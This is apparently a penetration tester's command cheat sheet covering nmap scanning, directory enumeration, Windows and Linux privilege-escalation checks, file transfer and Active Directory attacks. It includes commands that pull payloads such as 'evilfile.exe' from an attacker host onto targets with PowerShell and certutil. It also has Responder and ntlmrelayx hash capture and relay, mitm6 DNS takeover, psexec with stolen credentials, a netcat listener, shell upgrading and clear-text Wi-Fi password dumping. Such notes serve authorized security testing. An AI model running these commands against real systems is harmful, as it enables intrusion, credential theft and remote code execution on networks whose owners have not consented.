# scanning - nmap - initial scan
nmap -sC -sV -oA nmap/<NAME> 10.10.x.x #you can replace ip with '-iL targets.txt' if needed

# scanning - nmap - checking UDP ports
nmap -sU -oA nmap/<NAME>-udp 10.10.x.x

# scanning - nmap - all ports
nmap -sV -oA nmap/<NAME>-all-ports -p- 10.10.x.x

# scanning - nmap - Discovery Scan
nmap -sn -n --max-retries=2 --initial-rtt-timeout=250ms --max-rtt-timeout=400ms --max-scan-delay=10 --stats-every=10s  -PE -PS7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900-5901,6000-6002,6646,7070,8000,8008-8009,8080-8081,8443,8888,9000-9001,9090,9100,9102,9999-10001,32768,49152-49157 -PU53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,996-999,1434,1701,1900,3283,4500,5353,49152-49157 -vv -iL hosts/scope.txt --excludefile hosts/excluded-hosts.txt -oA nmap/discovery;/opt/pushover.sh 'Disco Completed' 'Disco scan has completed.'

# scanning - nmap - Create Livehosts.txt
grep Up nmap/discovery.gnmap | awk '{print $2}' | sort -V | uniq > hosts/livehosts.txt

# scanning - nmap - DNS Resolution of Hosts
nmap -R -sL -iL hosts/scope.txt --excludefile hosts/excluded-hosts.txt -oA nmap/dns-discovery | grep "^Nmap scan report for" | grep -E "\(|\)" | awk '{print $5, $6}' > hosts/dns-hosts.txt

# scanning - nmap - Pre-Profiling Scan
nmap -sT -Pn --top-ports 200 -T3 --initial-rtt-timeout=250ms --min-rtt-timeout=50ms --max-rtt-timeout=500ms --max-scan-delay=5ms --max-retries=2 --open -vv -iL hosts/livehosts.txt --excludefile hosts/excluded-hosts.txt -oA nmap/pre-profile

# scanning - nmap - Profiling Scan
nmap -R -sT -sV -sU -Pn -p T:1-65535,U:53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,996-999,1434,1701,1900,3283,4500,5353,49152-49154 -T3 --initial-rtt-timeout=250ms --min-rtt-timeout=50ms --max-rtt-timeout=500ms --max-scan-delay=5ms --max-retries=2 --stats-every=10s --open -vv -iL hosts/livehosts.txt --excludefile hosts/excluded-hosts.txt -oA nmap/profile;/opt/pushover.sh 'Profile Scan Completed' 'Profile scan has completed.'

# scanning - nmap - Scripts and Services Scan
nmap -R -sC -sV -O -Pn -p T:80,135,139,443,445,1433,1440,1452,3389,5022,5357,5985,9000,9003,11000,11001,11002,11003,11004,11005,11006,11007,11008,11009,11776,16001,49666,49667,65503,U:137 -T3 --initial-rtt-timeout=250ms --min-rtt-timeout=50ms --max-rtt-timeout=500ms --max-scan-delay=5ms --max-retries=2 --open -vv -iL hosts/livehosts.txt --excludefile hosts/excluded-hosts.txt -oA nmap/services-detail;/opt/pushover.sh 'Services Version Scan Completed' 'Services version scan has completed.'

# scanning - nmap - Targeted Discovery Scan
nmap -vvvv -sn -g443 -PE --max-rate=150 --min-hostgroup=25 --max-retries=2 --initial-rtt-timeout=250ms --max-rtt-timeout=400ms --max-scan-delay=5 --stats-every=10s -PS21-25,80,139,389,443,445,1099,1433,1521,2049,3260,3306,3389,4786,4848,5900,7001,8009,8443,8080,8081,8082,8880,20000,27017,55443 -PA21-25,80,139,389,443,445,1099,1433,1521,2049,3260,3306,3389,4786,4848,5900,7001,8009,8443,8080,8081,8082,8880,20000,27017,55443 -PU161,623 --stats-every=10s -iL hosts/scope.txt -oA nmap/targeted-disco-scan

# scanning - nmap - Targeted Profiling Scan
nmap -R -sT -sV -sU -Pn -p T:7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1099,1110,1433,1521,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3260,3306,3389,3986,4786,4848,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900-5901,6000-6002,6646,7001,7070,8000,8008-8009,8080-8081,8443,8888,9000-9001,9090,9100,9102,9999-10001,27017,32768,49152-49157,55443,U:53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,996-999,1434,1701,1900,3283,4500,5353,49152-49154 --max-rate=150 --min-hostgroup=25 --max-retries=2 --initial-rtt-timeout=250ms --max-rtt-timeout=400ms --max-scan-delay=5 --stats-every=10s --open -vv -iL hosts/livehosts.txt -oA nmap/targeted-profile-scan;/opt/pushover.sh 'Profile Scan Completed' 'Profile scan has completed.'

# scanning - nmap - Segmentation Test
nmap -sT -p1-65535 -Pn --min-rate=150 --max-rate=200 --min-hostgroup=25 --max-retries=2 --initial-rtt-timeout=250ms --max-rtt-timeout=400ms --max-scan-delay=5 --stats-every=10s -vv -iL hosts/cde-livehosts.txt --excludefile hosts/excluded-hosts.txt -oA nmap/segmentation;/opt/pushover.sh 'Segmentation Test Completed' 'Full 65k segmentation scan targing the CDE has completed.'

# scanning - nmap - Sort IP addresses in a file:
sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 scope-networks.txt

# scanning - nmap - Create Scope Table CSV (for insert into Report table)
sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 scope.txt | awk 'NR%4{printf "%s,",$0;next;}1'

# scanning - gobuster - enumerate subdomains
gobuster vhost --url <NAME>.htb -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt

# scanning - gobuster - enumerate directories
gobuster dir -u http://<RHOST> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out

# scanning - dirb - enumerate directories
dirb http://<NAME>.htb -r -o <NAME>.dirb

# Python quick http server to host files for victims to pull down
python -m SimpleHTTPServer <port>
python3 -m http.server <port>

# Simple netcat listener
nc -lvnp <port>

# create symbolic link (so github scripts can be called anywhere like apt packages)
ln -s source_file symbolic_link

# ssh proxy
ssh -i <key> -L<port to hit locally>:<RHOST>:<RPORT> <proxy ip>

# linux - privesc - find all SUID files and discard errors
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# windows - privesc - powershell check for world writable executables
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

# windows - privesc - powershell check for driver versions
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

# windows - privesc - check for whether non priviledged users can install updates
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

# windows - privesc - powershell check for interesting running services
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

# windows - privesc - check OS, version, architecture
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# windows - privesc - check for unquoted third party service paths
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# file transfer - scp - Copy file from a remote host to local host
scp username@from_host:file.txt /local/directory/

# file transfer - scp - Copy file from local host to a remote host
scp file.txt username@to_host:/remote/directory/

# file transfer - scp - Copy directory from a remote host to local host
scp -r username@from_host:/remote/directory/  /local/directory/

# file transfer - scp - Copy directory from local host to a remote host
scp -r /local/directory/ username@to_host:/remote/directory/

# file transfer - scp - Copy file from remote host to remote host
scp username@from_host:/remote/directory/file.txt username@to_host:/remote/directory/

# file transfer - powershell - pull files down on target
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>:8000/input.txt', 'output.txt')"

# file transfer - cmd - pull files down on target
certutil -urlcache -f http://<ATTACKER IP>/evilfile.exe evil.exe

# finding loot - dir - search windows filesystem for file
dir flag.txt /S /B

# finding loot - powershell - search windows filesystem for file
Get-Childitem –Path C:\ -Include *FLAG* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue

# finding loot - find - search linux filesystem for file
find / -type f -iname flag.txt 2>/dev/null

# OSINT - recon-ng - import list of names
1) Put names in first.last@example.com format:

sed 's/\s/./g' names.txt | sed 's/$/@example.com/g' > fname-dot-lname-emails.txt

2) Import email addresses into the recon-ng contacts table with import/list
3) Use the recon/contacts-contacts/unmangle module to populate the missing name fields from those email addresses
4) Run the mangle module to overwrite the original email addresses with a different format, like <first initial><last name>, eg. jdoe@example.com

# string manipulation - sed - stripping common suffixes
cat users.txt | sed -r 's/-md$|-do$|-cnp$|-aprn$|-crna$|-md-facog$|-dpm$|-md-pa$|-md-facs$//'

# string manipulation - sed - pulling a name list from a sitemap
grep provider xml-sitemap.html | cut -d '/' -f 6 | sed -r 's/-md$|-do$|-cnp$|-aprn$|-crna$|-md-facog$|-dpm$|-md-pa$|-md-facs$//' | sed 's/-/ /g'

# file transfer - vmware - mounting shared folder in guest after creating it in vmware
sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt -o allow_other

# search filters - wireshark - see wireless network names
(wlan.fc.type_subtype == 0x0008) or (wlan.fc.type_subtype == 0x0000) or (wlan.fc.type_subtype == 0x0005)

# file manipulation - remove duplicate lines
sort file.txt | uniq

# archiving - compress and archive every file in a directory (when you're in a directory that contains that directory)
tar -czvf interesting_files.tar.gz -C interesting_files .

# recon - internal - find devices on the local network
netdiscover -r <CIDR range>
arp-scan -l

# admin - note taking - initial set up - github and ssh
ssh-keygen -t ed25519 -C "name@example.com"
# copy ~/.ssh/id_ed25519.pub to https://github.com/settings/keys
ssh -T git@github.com
git clone git@github.com:v01dlight/public-tools.git
cd public-tools
git remote set-url origin git@github.com:v01dlight/public-tools.git
git config --global user.email "name@example.com"
git config --global user.name "Your Name"
gitter

# admin - initial setup - aliases
cp .bash_aliases ~
source ~/.bash_aliases
# to make aliases auto load on Kali
nano ~/.zshrc # append the following:
"""
# load custom aliases
if [ -f ~/.bash_aliases ]; then
        source ~/.bash_aliases
fi
"""

# admin - git - fix issue - error: object file ...  is empty - fatal: loose object ... is corrupt
# remove any empty object files
find .git/objects/ -type f -empty | xargs rm
# fetch down the missing objects
git fetch -p
# do a full object store check
git fsck --full

# admin - unzip a file
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# active directory - LLMNR poisoning - grabbing hashes with responder
sudo responder -I eth0 -rdw
cat /usr/share/responder/logs/SMB* > loot/[CLIENT].hashes

# active directory - pass the hash - relaying captured hashes through SMB
sudo nano /etc/responder/Responder.conf
# turn off SMB and HTTP
sudo responder -I eth0 -rdwv
# leave that running and open a new tab for the relay
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# if successful an interactive SMB shell will be spawned, which we can connect to with netcat (or similar)
nc 127.0.0.1 11000
# we can likely get a full shell with those credentials through psexec
impacket-psexec [DOMAIN]/[USER]:[PASS]@[RHOST]

# active directory - IPv6 - DNS takeover with mitm6
sudo python3 mitm6.py -d [DOMAIN]
# we can relay captured credentials from that (usually triggered on a machine reboot) using ntlmrelayx
impacket-ntlmrelayx -6 -t ldaps://[DC IP] -wh fakewpad.[DOMAIN] -l enumeration

# finding loot - windows - wifi - grab wifi passwords
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

# upgrade shell to fully interactive - python
python -c 'import pty;pty.spawn("/bin/bash");'
#CTRL+Z
stty raw -echo
fg # this will be invisible

# post exploitation - proof - moneyshot
whoami && id && hostname && ifconfig

# privesc - scripts - download linPEAS
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh

# logging - screen - start session
screen -S <session name>

# logging - screen - show sessions
screen -ls

# logging - screen - detach from a session
screen -D # or 'Ctrl+a, d' if you're currently in that session

# logging - screen - reattach to a session
screen -r

# web - chrome - bypass privacy warning
try typing “badidea” or “thisisunsafe” directly in chrome on the same page